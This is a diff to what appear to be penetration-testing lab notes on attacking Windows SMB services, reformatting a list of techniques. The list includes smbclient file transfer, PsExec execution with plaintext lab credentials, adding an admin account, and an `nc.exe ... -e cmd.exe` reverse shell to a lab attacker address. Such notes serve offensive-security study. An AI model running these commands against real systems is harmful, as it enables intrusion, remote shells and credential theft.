@@ -28,20 +28,20 @@ $ enum4linux target        // enum info from Windows and Samba hosts
 `msfconsole> use auxiliary/scanner/smb/pipe_auditor`
 ```
 
-Things to try:
-* Accessing shared dirs: `smbclient \\\\10.11.1.75\\Users`
-    * `smb:\> put src_file remote_file`
-    * `smb:\> get remote_file`
-    * Put nc.exe => reverse shell
-    * Get password files => access via. ssh/ rdp
-* MS17-010 Code Exec
-    * `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
-    * `runas`
-    * `nc.exe 10.11.0.42 443 -e cmd.exe`
-    * Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit
-* Privesc
-    * Mount drives: `net use z: \\10.11.1.49\Users /user:alice aliceishere`
-    
+Accessing shared dirs: `smbclient \\\\10.11.1.75\\Users`
+* `smb:\> put src_file remote_file`
+* `smb:\> get remote_file`
+* Put nc.exe => reverse shell
+* Get password files => access via. ssh/ rdp
+
+MS17-010 Code Exec
+* `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
+* `runas`
+* `nc.exe 10.11.0.42 443 -e cmd.exe`
+* Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit
+
+Privesc
+* Mount shared drives: `net use z: \\10.11.1.49\Users /user:alice aliceishere`
 
 Exploits:
 * [MS08-067] NetAPI module in Windows SMB
